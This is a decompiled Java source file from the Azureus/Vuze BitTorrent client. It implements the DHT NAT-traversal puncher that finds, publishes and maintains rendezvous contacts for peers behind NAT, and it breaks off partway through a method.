/*      */ package com.aelitis.azureus.core.dht.nat.impl;
/*      */ 
/*      */ import com.aelitis.azureus.core.dht.DHT;
/*      */ import com.aelitis.azureus.core.dht.DHTLogger;
/*      */ import com.aelitis.azureus.core.dht.DHTOperationAdapter;
/*      */ import com.aelitis.azureus.core.dht.DHTOperationListener;
/*      */ import com.aelitis.azureus.core.dht.nat.DHTNATPuncher;
/*      */ import com.aelitis.azureus.core.dht.nat.DHTNATPuncherAdapter;
/*      */ import com.aelitis.azureus.core.dht.nat.DHTNATPuncherListener;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransport;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransportContact;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransportException;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransportListener;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransportReplyHandlerAdapter;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransportTransferHandler;
/*      */ import com.aelitis.azureus.core.dht.transport.DHTTransportValue;
/*      */ import com.aelitis.azureus.core.dht.transport.udp.DHTTransportUDP;
/*      */ import com.aelitis.azureus.core.dht.transport.udp.DHTTransportUDPContact;
/*      */ import com.aelitis.azureus.core.util.CopyOnWriteList;
/*      */ import java.io.ByteArrayInputStream;
/*      */ import java.io.ByteArrayOutputStream;
/*      */ import java.io.DataInputStream;
/*      */ import java.io.DataOutputStream;
/*      */ import java.lang.reflect.Method;
/*      */ import java.math.BigInteger;
/*      */ import java.net.InetAddress;
/*      */ import java.net.InetSocketAddress;
/*      */ import java.security.KeyFactory;
/*      */ import java.security.Signature;
/*      */ import java.security.spec.RSAPublicKeySpec;
/*      */ import java.util.ArrayList;
/*      */ import java.util.Arrays;
/*      */ import java.util.Collection;
/*      */ import java.util.Collections;
/*      */ import java.util.HashMap;
/*      */ import java.util.HashSet;
/*      */ import java.util.Iterator;
/*      */ import java.util.LinkedHashMap;
/*      */ import java.util.List;
/*      */ import java.util.Map;
/*      */ import java.util.Map.Entry;
/*      */ import java.util.Set;
/*      */ import org.gudy.azureus2.core3.util.AESemaphore;
/*      */ import org.gudy.azureus2.core3.util.AEThread2;
/*      */ import org.gudy.azureus2.core3.util.BDecoder;
/*      */ import org.gudy.azureus2.core3.util.Debug;
/*      */ import org.gudy.azureus2.core3.util.SHA1Simple;
/*      */ import org.gudy.azureus2.core3.util.SimpleTimer;
/*      */ import org.gudy.azureus2.core3.util.SystemTime;
/*      */ import org.gudy.azureus2.core3.util.TimerEvent;
/*      */ import org.gudy.azureus2.core3.util.TimerEventPerformer;
/*      */ import org.gudy.azureus2.plugins.PluginInterface;
/*      */ import org.gudy.azureus2.plugins.utils.Formatters;
/*      */ import org.gudy.azureus2.plugins.utils.Monitor;
/*      */ import org.gudy.azureus2.plugins.utils.Semaphore;
/*      */ import org.gudy.azureus2.plugins.utils.UTTimer;
/*      */ import org.gudy.azureus2.plugins.utils.UTTimerEvent;
/*      */ import org.gudy.azureus2.plugins.utils.UTTimerEventPerformer;
/*      */ import org.gudy.azureus2.plugins.utils.Utilities;
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ public class DHTNATPuncherImpl
/*      */   implements DHTNATPuncher
/*      */ {
/*      */   private static final boolean TESTING = false;
/*      */   private static final boolean TRACE = false;
/*      */   private static final int RT_BIND_REQUEST = 0;
/*      */   private static final int RT_BIND_REPLY = 1;
/*      */   private static final int RT_PUNCH_REQUEST = 2;
/*      */   private static final int RT_PUNCH_REPLY = 3;
/*      */   private static final int RT_CONNECT_REQUEST = 4;
/*      */   private static final int RT_CONNECT_REPLY = 5;
/*      */   private static final int RT_TUNNEL_INBOUND = 6;
/*      */   private static final int RT_TUNNEL_OUTBOUND = 7;
/*      */   private static final int RT_QUERY_REQUEST = 8;
/*      */   private static final int RT_QUERY_REPLY = 9;
/*      */   private static final int RT_CLOSE_REQUEST = 10;
/*      */   private static final int RT_CLOSE_REPLY = 11;
/*      */   private static final int RESP_OK = 0;
/*      */   private static final int RESP_NOT_OK = 1;
/*      */   private static final int RESP_FAILED = 2;
/*   89 */   private static final byte[] transfer_handler_key = new SHA1Simple().calculateHash("Aelitis:NATPuncher:TransferHandlerKey".getBytes());
/*      */   
/*      */   private boolean started;
/*      */   
/*      */   private final DHTNATPuncherAdapter adapter;
/*      */   
/*      */   private final DHT dht;
/*      */   
/*      */   private final DHTLogger logger;
/*      */   
/*      */   private final boolean is_secondary;
/*      */   
/*      */   private final PluginInterface plugin_interface;
/*      */   private final Formatters formatters;
/*      */   private final UTTimer timer;
/*      */   private static final int REPUBLISH_TIME_MIN = 300000;
/*      */   private static final int TRANSFER_TIMEOUT = 30000;
/*      */   private static final int RENDEZVOUS_LOOKUP_TIMEOUT = 30000;
/*      */   private static final int TUNNEL_TIMEOUT = 3000;
/*      */   private static final int RENDEZVOUS_SERVER_MAX = 8;
/*      */   private static final int RENDEZVOUS_SERVER_TIMEOUT = 300000;
/*      */   private static final int RENDEZVOUS_CLIENT_PING_PERIOD = 50000;
/*      */   private static final int RENDEZVOUS_PING_FAIL_LIMIT = 4;
/*      */   final Monitor server_mon;
/*  113 */   final Map<String, BindingData> rendezvous_bindings = new HashMap();
/*      */   
/*  115 */   final CopyOnWriteList<DHTNATPuncherImpl> secondaries = new CopyOnWriteList();
/*      */   
/*      */   private boolean force_active;
/*      */   
/*      */   private long last_publish;
/*      */   
/*      */   final Monitor pub_mon;
/*      */   
/*      */   private boolean publish_in_progress;
/*      */   
/*      */   private volatile DHTTransportContact rendezvous_local_contact;
/*      */   private volatile DHTTransportContact rendezvous_target;
/*      */   private volatile DHTTransportContact last_ok_rendezvous;
/*  128 */   private final int[] MESSAGE_STATS = new int[12];
/*      */   
/*      */   private int punch_send_ok;
/*      */   
/*      */   private int punch_send_fail;
/*      */   
/*      */   private int punch_recv_ok;
/*      */   private int punch_recv_fail;
/*      */   private static final int FAILED_RENDEZVOUS_HISTORY_MAX = 16;
/*  137 */   private final Map failed_rendezvous = new LinkedHashMap(16, 0.75F, true)
/*      */   {
/*      */ 
/*      */ 
/*      */     protected boolean removeEldestEntry(Map.Entry eldest)
/*      */     {
/*      */ 
/*  144 */       return size() > 16;
/*      */     }
/*      */   };
/*      */   
/*      */   private boolean rendezvous_running;
/*      */   
/*  150 */   private final Map explicit_rendezvous_map = new HashMap();
/*      */   
/*      */   private final Monitor punch_mon;
/*  153 */   private final List oustanding_punches = new ArrayList();
/*      */   
/*      */ 
/*  156 */   private DHTTransportContact current_local = null;
/*  157 */   private DHTTransportContact current_target = null;
/*  158 */   private int rendevzous_fail_count = 0;
/*      */   
/*      */   private long rendezvous_last_ok_time;
/*      */   
/*      */   private long rendezvous_last_fail_time;
/*      */   private volatile byte[] last_publish_key;
/*      */   private volatile List<DHTTransportContact> last_write_set;
/*  165 */   private final CopyOnWriteList<DHTNATPuncherListener> listeners = new CopyOnWriteList();
/*      */   
/*      */ 
/*      */   private boolean suspended;
/*      */   
/*      */ 
/*      */ 
/*      */   public DHTNATPuncherImpl(DHTNATPuncherAdapter _adapter, DHT _dht)
/*      */   {
/*  174 */     this(_adapter, _dht, false);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   private DHTNATPuncherImpl(DHTNATPuncherAdapter _adapter, DHT _dht, boolean _is_secondary)
/*      */   {
/*  183 */     this.adapter = _adapter;
/*  184 */     this.dht = _dht;
/*  185 */     this.is_secondary = _is_secondary;
/*      */     
/*      */ 
/*  188 */     this.logger = this.dht.getLogger();
/*      */     
/*  190 */     this.plugin_interface = this.dht.getLogger().getPluginInterface();
/*      */     
/*  192 */     this.formatters = this.plugin_interface.getUtilities().getFormatters();
/*  193 */     this.pub_mon = this.plugin_interface.getUtilities().getMonitor();
/*  194 */     this.server_mon = this.plugin_interface.getUtilities().getMonitor();
/*  195 */     this.punch_mon = this.plugin_interface.getUtilities().getMonitor();
/*      */     
/*  197 */     this.timer = this.plugin_interface.getUtilities().createTimer("DHTNATPuncher:refresher", true);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   public DHTNATPuncher getSecondaryPuncher()
/*      */   {
/*  204 */     if (this.is_secondary)
/*      */     {
/*  206 */       throw new RuntimeException("Use a primary!");
/*      */     }
/*      */     
/*  209 */     DHTNATPuncherImpl res = new DHTNATPuncherImpl(this.adapter, this.dht, true);
/*      */     
/*  211 */     boolean start_it = false;
/*      */     
/*  213 */     synchronized (this.secondaries)
/*      */     {
/*  215 */       if (this.started)
/*      */       {
/*  217 */         start_it = true;
/*      */       }
/*      */       
/*      */ 
/*  221 */       this.secondaries.add(res);
/*      */       
/*  223 */       if (this.suspended)
/*      */       {
/*  225 */         res.setSuspended(true);
/*      */       }
/*      */     }
/*      */     
/*  229 */     if (start_it)
/*      */     {
/*  231 */       res.start();
/*      */     }
/*      */     
/*  234 */     return res;
/*      */   }
/*      */   
/*      */ 
/*      */   public void start()
/*      */   {
/*  240 */     List<DHTNATPuncherImpl> to_start = new ArrayList();
/*      */     
/*  242 */     synchronized (this.secondaries)
/*      */     {
/*  244 */       if (this.started)
/*      */       {
/*  246 */         return;
/*      */       }
/*      */       
/*  249 */       this.started = true;
/*      */       
/*  251 */       for (DHTNATPuncherImpl x : this.secondaries)
/*      */       {
/*  253 */         if (!x.started)
/*      */         {
/*  255 */           to_start.add(x);
/*      */         }
/*      */       }
/*      */     }
/*      */     
/*  260 */     for (DHTNATPuncherImpl x : to_start)
/*      */     {
/*  262 */       x.start();
/*      */     }
/*      */     
/*  265 */     DHTTransport transport = this.dht.getTransport();
/*      */     
/*  267 */     transport.addListener(new DHTTransportListener()
/*      */     {
/*      */ 
/*      */ 
/*      */       public void localContactChanged(DHTTransportContact local_contact)
/*      */       {
/*      */ 
/*  274 */         DHTNATPuncherImpl.this.publish(false);
/*      */       }
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */       public void resetNetworkPositions() {}
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */       public void currentAddress(String address) {}
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */       public void reachabilityChanged(boolean reacheable)
/*      */       {
/*  292 */         DHTNATPuncherImpl.this.publish(false);
/*      */       }
/*      */     });
/*      */     
/*      */ 
/*  297 */     if (!this.is_secondary)
/*      */     {
/*  299 */       transport.registerTransferHandler(transfer_handler_key, new DHTTransportTransferHandler()
/*      */       {
/*      */ 
/*      */ 
/*      */         public String getName()
/*      */         {
/*      */ 
/*  306 */           return "NAT Traversal";
/*      */         }
/*      */         
/*      */ 
/*      */ 
/*      */ 
/*      */         public byte[] handleRead(DHTTransportContact originator, byte[] key)
/*      */         {
/*  314 */           return null;
/*      */         }
/*      */         
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */         public byte[] handleWrite(DHTTransportContact originator, byte[] key, byte[] value)
/*      */         {
/*  323 */           DHTNATPuncherImpl owner = DHTNATPuncherImpl.this;
/*      */           
/*  325 */           for (DHTNATPuncherImpl x : DHTNATPuncherImpl.this.secondaries)
/*      */           {
/*  327 */             DHTTransportContact ct = x.current_target;
/*      */             
/*  329 */             if ((ct != null) && (ct.getExternalAddress().equals(originator.getExternalAddress())))
/*      */             {
/*  331 */               owner = x;
/*      */             }
/*      */           }
/*      */           
/*  335 */           return owner.receiveRequest((DHTTransportUDPContact)originator, value);
/*      */         }
/*      */         
/*  338 */       });
/*  339 */       this.timer.addPeriodicEvent(150000L, new UTTimerEventPerformer()
/*      */       {
/*      */ 
/*      */ 
/*      */         public void perform(UTTimerEvent event)
/*      */         {
/*      */ 
/*      */ 
/*  347 */           if (DHTNATPuncherImpl.this.suspended)
/*      */           {
/*  349 */             return;
/*      */           }
/*      */           
/*  352 */           long now = SystemTime.getMonotonousTime();
/*      */           try
/*      */           {
/*  355 */             DHTNATPuncherImpl.this.server_mon.enter();
/*      */             
/*  357 */             Iterator<DHTNATPuncherImpl.BindingData> it = DHTNATPuncherImpl.this.rendezvous_bindings.values().iterator();
/*      */             
/*  359 */             while (it.hasNext())
/*      */             {
/*  361 */               DHTNATPuncherImpl.BindingData entry = (DHTNATPuncherImpl.BindingData)it.next();
/*      */               
/*  363 */               long time = DHTNATPuncherImpl.BindingData.access$200(entry);
/*      */               
/*  365 */               boolean removed = false;
/*      */               
/*  367 */               if (now - time > 300000L)
/*      */               {
/*      */ 
/*      */ 
/*  371 */                 it.remove();
/*      */                 
/*  373 */                 removed = true;
/*      */               }
/*      */               
/*  376 */               if (removed)
/*      */               {
/*  378 */                 DHTNATPuncherImpl.this.log("Rendezvous " + DHTNATPuncherImpl.BindingData.access$300(entry).getString() + " removed due to inactivity");
/*      */               }
/*      */             }
/*      */           }
/*      */           finally {
/*  383 */             DHTNATPuncherImpl.this.server_mon.exit();
/*      */           }
/*      */           
/*  386 */           Set<InetAddress> rends = new HashSet();
/*      */           
/*  388 */           DHTTransportContact ct = DHTNATPuncherImpl.this.current_target;
/*      */           
/*  390 */           if (ct != null)
/*      */           {
/*  392 */             rends.add(ct.getExternalAddress().getAddress());
/*      */           }
/*      */           
/*  395 */           for (DHTNATPuncherImpl x : DHTNATPuncherImpl.this.secondaries)
/*      */           {
/*  397 */             ct = x.current_target;
/*      */             
/*  399 */             if (ct != null)
/*      */             {
/*  401 */               InetAddress ia = ct.getExternalAddress().getAddress();
/*      */               
/*  403 */               if (rends.contains(ia))
/*      */               {
/*  405 */                 DHTNATPuncherImpl.this.log("Duplicate secondary rendezvous: " + ct.getString() + ", re-binding");
/*      */                 
/*  407 */                 x.rendezvousFailed(ct, true);
/*      */               }
/*      */               else
/*      */               {
/*  411 */                 rends.add(ia);
/*      */               }
/*      */             }
/*      */           }
/*      */         }
/*      */       });
/*      */     }
/*      */     
/*  419 */     this.timer.addPeriodicEvent(300000L, new UTTimerEventPerformer()
/*      */     {
/*      */ 
/*      */ 
/*      */       public void perform(UTTimerEvent event)
/*      */       {
/*      */ 
/*      */ 
/*  427 */         DHTNATPuncherImpl.this.publish(false);
/*      */       }
/*      */       
/*      */ 
/*  431 */     });
/*  432 */     publish(false);
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   public void setSuspended(boolean susp)
/*      */   {
/*  439 */     this.suspended = susp;
/*      */     
/*  441 */     synchronized (this.secondaries)
/*      */     {
/*  443 */       for (DHTNATPuncherImpl x : this.secondaries)
/*      */       {
/*  445 */         x.setSuspended(susp);
/*      */       }
/*      */     }
/*      */     
/*  449 */     if (!susp)
/*      */     {
/*  451 */       final DHTTransportContact current_contact = this.rendezvous_target;
/*      */       
/*  453 */       this.timer.addEvent(SystemTime.getCurrentTime() + 20000L, new UTTimerEventPerformer()
/*      */       {
/*      */ 
/*      */ 
/*      */         public void perform(UTTimerEvent event)
/*      */         {
/*      */ 
/*      */ 
/*  461 */           if ((current_contact != null) && (current_contact == DHTNATPuncherImpl.this.rendezvous_target))
/*      */           {
/*  463 */             DHTNATPuncherImpl.this.rendezvousFailed(current_contact, false);
/*      */           }
/*      */           else
/*      */           {
/*  467 */             DHTNATPuncherImpl.this.publish(false);
/*      */           }
/*      */         }
/*      */       });
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */   public boolean active()
/*      */   {
/*  477 */     return this.rendezvous_local_contact != null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   public void forceActive(boolean force)
/*      */   {
/*  484 */     this.force_active = force;
/*      */     
/*  486 */     if (force)
/*      */     {
/*  488 */       publish(true);
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */   public boolean operational()
/*      */   {
/*  495 */     DHTTransportContact ok = this.last_ok_rendezvous;
/*      */     
/*  497 */     if ((ok != null) && (ok == this.rendezvous_target))
/*      */     {
/*  499 */       return true;
/*      */     }
/*      */     
/*  502 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */   public DHTTransportContact getLocalContact()
/*      */   {
/*  508 */     return this.rendezvous_local_contact;
/*      */   }
/*      */   
/*      */ 
/*      */   public DHTTransportContact getRendezvous()
/*      */   {
/*  514 */     DHTTransportContact ok = this.last_ok_rendezvous;
/*      */     
/*  516 */     if ((ok != null) && (ok == this.rendezvous_target))
/*      */     {
/*  518 */       return ok;
/*      */     }
/*      */     
/*  521 */     return null;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */   protected void publish(boolean force)
/*      */   {
/*  528 */     long now = SystemTime.getMonotonousTime();
/*      */     
/*  530 */     if ((force) || (now - this.last_publish >= 300000L))
/*      */     {
/*  532 */       this.last_publish = now;
/*      */       
/*  534 */       this.plugin_interface.getUtilities().createThread("DHTNATPuncher:publisher", new Runnable()
/*      */       {
/*      */ 
/*      */         public void run()
/*      */         {
/*      */ 
/*      */           try
/*      */           {
/*  542 */             DHTNATPuncherImpl.this.pub_mon.enter();
/*      */             
/*  544 */             if (DHTNATPuncherImpl.this.suspended) {
/*      */               return;
/*      */             }
/*      */             
/*      */ 
/*  549 */             if (DHTNATPuncherImpl.this.publish_in_progress) {
/*      */               return;
/*      */             }
/*      */             
/*      */ 
/*  554 */             DHTNATPuncherImpl.this.publish_in_progress = true;
/*      */           }
/*      */           finally
/*      */           {
/*  558 */             DHTNATPuncherImpl.this.pub_mon.exit();
/*      */           }
/*      */           try
/*      */           {
/*  562 */             DHTNATPuncherImpl.this.publishSupport();
/*      */           }
/*      */           finally
/*      */           {
/*      */             try {
/*  567 */               DHTNATPuncherImpl.this.pub_mon.enter();
/*      */               
/*  569 */               DHTNATPuncherImpl.this.publish_in_progress = false;
/*      */             }
/*      */             finally
/*      */             {
/*  573 */               DHTNATPuncherImpl.this.pub_mon.exit();
/*      */             }
/*      */           }
/*      */         }
/*      */       });
/*      */     }
/*      */   }
/*      */   
/*      */ 
/*      */   protected void publishSupport()
/*      */   {
/*  584 */     DHTTransport transport = this.dht.getTransport();
/*      */     
/*  586 */     if ((this.force_active) || (!transport.isReachable()))
/*      */     {
/*  588 */       DHTTransportContact local_contact = transport.getLocalContact();
/*      */       
/*      */ 
/*      */ 
/*  592 */       boolean force = (this.rendezvous_target != null) && (this.failed_rendezvous.containsKey(this.rendezvous_target.getAddress()));
/*      */       
/*      */ 
/*      */ 
/*  596 */       if ((this.rendezvous_local_contact != null) && (!force))
/*      */       {
/*  598 */         if (local_contact.getAddress().equals(this.rendezvous_local_contact.getAddress()))
/*      */         {
/*      */ 
/*      */ 
/*  602 */           return;
/*      */         }
/*      */       }
/*      */       
/*  606 */       DHTTransportContact explicit = (DHTTransportContact)this.explicit_rendezvous_map.get(local_contact.getAddress());
/*      */       
/*  608 */       if (explicit != null)
/*      */       {
/*      */         try {
/*  611 */           this.pub_mon.enter();
/*      */           
/*  613 */           this.rendezvous_local_contact = local_contact;
/*  614 */           this.rendezvous_target = explicit;
/*      */           
/*  616 */           runRendezvous();
/*      */         }
/*      */         finally
/*      */         {
/*  620 */           this.pub_mon.exit();
/*      */         }
/*      */       }
/*      */       else {
/*  624 */         final DHTTransportContact[] new_rendezvous_target = { null };
/*      */         
/*  626 */         DHTTransportContact[] reachables = this.dht.getTransport().getReachableContacts();
/*      */         
/*  628 */         Collections.shuffle(Arrays.asList(reachables));
/*      */         
/*  630 */         int reachables_tried = 0;
/*  631 */         int reachables_skipped = 0;
/*      */         
/*  633 */         final Semaphore sem = this.plugin_interface.getUtilities().getSemaphore();
/*      */         
/*  635 */         for (int i = 0; i < reachables.length; i++)
/*      */         {
/*  637 */           DHTTransportContact contact = reachables[i];
/*      */           try
/*      */           {
/*  640 */             this.pub_mon.enter();
/*      */             
/*      */ 
/*      */ 
/*  644 */             if (new_rendezvous_target[0] != null)
/*      */             {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  661 */               this.pub_mon.exit(); break;
/*      */             }
/*  651 */             if (this.failed_rendezvous.containsKey(contact.getAddress()))
/*      */             {
/*  653 */               reachables_skipped++;
/*      */               
/*  655 */               sem.release();
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  661 */               this.pub_mon.exit(); continue; } } finally { this.pub_mon.exit();
/*      */           }
/*      */           
/*  664 */           if (i > 0) {
/*      */             try
/*      */             {
/*  667 */               Thread.sleep(1000L);
/*      */             }
/*      */             catch (Throwable e) {}
/*      */           }
/*      */           
/*      */ 
/*      */ 
/*  674 */           reachables_tried++;
/*      */           
/*  676 */           contact.sendPing(new DHTTransportReplyHandlerAdapter()
/*      */           {
/*      */ 
/*      */ 
/*      */             public void pingReply(DHTTransportContact ok_contact)
/*      */             {
/*      */ 
/*  683 */               DHTNATPuncherImpl.this.trace("Punch:" + ok_contact.getString() + " OK");
/*      */               try
/*      */               {
/*  686 */                 DHTNATPuncherImpl.this.pub_mon.enter();
/*      */                 
/*  688 */                 if (new_rendezvous_target[0] == null)
/*      */                 {
/*  690 */                   new_rendezvous_target[0] = ok_contact;
/*      */                 }
/*      */               }
/*      */               finally {
/*  694 */                 DHTNATPuncherImpl.this.pub_mon.exit();
/*      */                 
/*  696 */                 sem.release();
/*      */               }
/*      */             }
/*      */             
/*      */ 
/*      */ 
/*      */             public void failed(DHTTransportContact failed_contact, Throwable e)
/*      */             {
/*      */               try
/*      */               {
/*  706 */                 DHTNATPuncherImpl.this.trace("Punch:" + failed_contact.getString() + " Failed");
/*      */               }
/*      */               finally
/*      */               {
/*  710 */                 sem.release();
/*      */               }
/*      */             }
/*      */           });
/*      */         }
/*      */         
/*  716 */         for (int i = 0; i < reachables.length; i++)
/*      */         {
/*  718 */           sem.reserve();
/*      */           try
/*      */           {
/*  721 */             this.pub_mon.enter();
/*      */             
/*  723 */             if (new_rendezvous_target[0] != null)
/*      */             {
/*  725 */               this.rendezvous_target = new_rendezvous_target[0];
/*  726 */               this.rendezvous_local_contact = local_contact;
/*      */               
/*  728 */               log("Rendezvous found: " + this.rendezvous_local_contact.getString() + " -> " + this.rendezvous_target.getString());
/*      */               
/*  730 */               runRendezvous();
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  736 */               this.pub_mon.exit(); break; } } finally { this.pub_mon.exit();
/*      */           }
/*      */         }
/*      */         
/*  740 */         if (new_rendezvous_target[0] == null)
/*      */         {
/*  742 */           log("No rendezvous found: candidates=" + reachables.length + ",tried=" + reachables_tried + ",skipped=" + reachables_skipped);
/*      */           try
/*      */           {
/*  745 */             this.pub_mon.enter();
/*      */             
/*  747 */             this.rendezvous_local_contact = null;
/*  748 */             this.rendezvous_target = null;
/*      */           }
/*      */           finally
/*      */           {
/*  752 */             this.pub_mon.exit();
/*      */           }
/*      */         }
/*      */       }
/*      */     }
/*      */     else {
/*      */       try {
/*  759 */         this.pub_mon.enter();
/*      */         
/*  761 */         this.rendezvous_local_contact = null;
/*  762 */         this.rendezvous_target = null;
/*      */       }
/*      */       finally
/*      */       {
/*  766 */         this.pub_mon.exit();
/*      */       }
/*      */     }
/*      */   }
/*      */   
/*      */   protected void runRendezvous()
/*      */   {
/*      */     try
/*      */     {
/*  775 */       this.pub_mon.enter();
/*      */       
/*  777 */       if (!this.rendezvous_running)
/*      */       {
/*  779 */         this.rendezvous_running = true;
/*      */         
/*  781 */         SimpleTimer.addPeriodicEvent("DHTNAT:cp", 50000L, new TimerEventPerformer()
/*      */         {
/*      */ 
/*      */ 
/*      */ 
/*      */           public void perform(TimerEvent ev)
/*      */           {
/*      */ 
/*      */ 
/*  790 */             if (!DHTNATPuncherImpl.this.suspended)
/*      */             {
/*  792 */               DHTNATPuncherImpl.this.runRendezvousSupport();
/*      */             }
/*      */           }
/*      */         });
/*      */       }
/*      */     }
/*      */     finally {
/*  799 */       this.pub_mon.exit();
/*      */     }
/*      */   }
/*      */   
/*      */   protected void runRendezvousSupport()
/*      */   {
/*      */     try
/*      */     {
/*      */       DHTTransportContact latest_local;
/*      */       DHTTransportContact latest_target;
/*      */       try
/*      */       {
/*  811 */         this.pub_mon.enter();
/*      */         
/*  813 */         latest_local = this.rendezvous_local_contact;
/*  814 */         latest_target = this.rendezvous_target;
/*      */       }
/*      */       finally {
/*  817 */         this.pub_mon.exit();
/*      */       }
/*      */       
/*  820 */       if ((this.current_local != null) || (latest_local != null))
/*      */       {
/*      */ 
/*      */ 
/*  824 */         if (this.current_local != latest_local)
/*      */         {
/*      */ 
/*      */ 
/*  828 */           if (this.current_local != null)
/*      */           {
/*  830 */             if (!this.is_secondary)
/*      */             {
/*  832 */               log("Removing publish for " + this.current_local.getString() + " -> " + this.current_target.getString());
/*      */               
/*  834 */               this.dht.remove(getPublishKey(this.current_local), "DHTNatPuncher: removal of publish", new DHTOperationListener()
/*      */               {
/*      */                 public void searching(DHTTransportContact contact, int level, int active_searches) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void found(DHTTransportContact contact, boolean is_closest) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public boolean diversified(String desc)
/*      */                 {
/*  856 */                   return true;
/*      */                 }
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void read(DHTTransportContact contact, DHTTransportValue value) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void wrote(DHTTransportContact contact, DHTTransportValue value) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void complete(boolean timeout) {}
/*      */               });
/*      */             }
/*      */           }
/*      */           
/*      */ 
/*      */ 
/*  879 */           if (latest_local != null)
/*      */           {
/*  881 */             this.rendevzous_fail_count = 2;
/*      */             
/*  883 */             if (!this.is_secondary)
/*      */             {
/*  885 */               log("Adding publish for " + latest_local.getString() + " -> " + latest_target.getString());
/*      */               
/*  887 */               final byte[] publish_key = getPublishKey(latest_local);
/*      */               
/*  889 */               this.dht.put(publish_key, "NAT Traversal: rendezvous publish", encodePublishValue(latest_target), (short)0, new DHTOperationListener()
/*      */               {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  896 */                 private final List<DHTTransportContact> written_to = new ArrayList();
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void searching(DHTTransportContact contact, int level, int active_searches) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void found(DHTTransportContact contact, boolean is_closest) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public boolean diversified(String desc)
/*      */                 {
/*  915 */                   return true;
/*      */                 }
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void read(DHTTransportContact contact, DHTTransportValue value) {}
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */                 public void wrote(DHTTransportContact contact, DHTTransportValue value)
/*      */                 {
/*  929 */                   synchronized (this.written_to)
/*      */                   {
/*  931 */                     this.written_to.add(contact);
/*      */                   }
/*      */                 }
/*      */                 
/*      */ 
/*      */ 
/*      */                 public void complete(boolean timeout)
/*      */                 {
/*  939 */                   synchronized (this.written_to) {
/*  940 */                     DHTNATPuncherImpl.this.last_publish_key = publish_key;
/*  941 */                     DHTNATPuncherImpl.this.last_write_set = this.written_to;
/*      */                   }
/*      */                 }
/*      */               });
/*      */             }
/*      */           }
/*  947 */         } else if (this.current_target != latest_target)
/*      */         {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  953 */           this.rendevzous_fail_count = 2;
/*      */           
/*  955 */           if (!this.is_secondary)
/*      */           {
/*  957 */             log("Updating publish for " + latest_local.getString() + " -> " + latest_target.getString());
/*      */             
/*  959 */             final byte[] publish_key = getPublishKey(latest_local);
/*      */             
/*  961 */             this.dht.put(publish_key, "DHTNatPuncher: update publish", encodePublishValue(latest_target), (short)0, new DHTOperationListener()
/*      */             {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  968 */               private final List<DHTTransportContact> written_to = new ArrayList();
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */               public void searching(DHTTransportContact contact, int level, int active_searches) {}
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */               public void found(DHTTransportContact contact, boolean is_closest) {}
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */               public boolean diversified(String desc)
/*      */               {
/*  987 */                 return true;
/*      */               }
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */               public void read(DHTTransportContact contact, DHTTransportValue value) {}
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */               public void wrote(DHTTransportContact contact, DHTTransportValue value)
/*      */               {
/* 1001 */                 synchronized (this.written_to)
/*      */                 {
/* 1003 */                   this.written_to.add(contact);
/*      */                 }
/*      */               }
/*      */               
/*      */ 
/*      */ 
/*      */               public void complete(boolean timeout)
/*      */               {
/* 1011 */                 synchronized (this.written_to) {
/* 1012 */                   DHTNATPuncherImpl.this.last_publish_key = publish_key;
/* 1013 */                   DHTNATPuncherImpl.this.last_write_set = this.written_to;
/*      */                 }
/*      */               }
/*      */             });
/*      */           }
/*      */         }
/*      */       }
/*      */       
/* 1021 */       this.current_local = latest_local;
/* 1022 */       this.current_target = latest_target;
/*      */       
/* 1024 */       if (this.current_target != null)
/*      */       {
/* 1026 */         long now = SystemTime.getMonotonousTime();
/*      */         
/* 1028 */         int bind_result = sendBind(this.current_target);
/*      */         
/* 1030 */         if (bind_result == 0)
/*      */         {
/* 1032 */           trace("Rendezvous:" + this.current_target.getString() + " OK");
/*      */           
/* 1034 */           this.rendevzous_fail_count = 0;
/*      */           
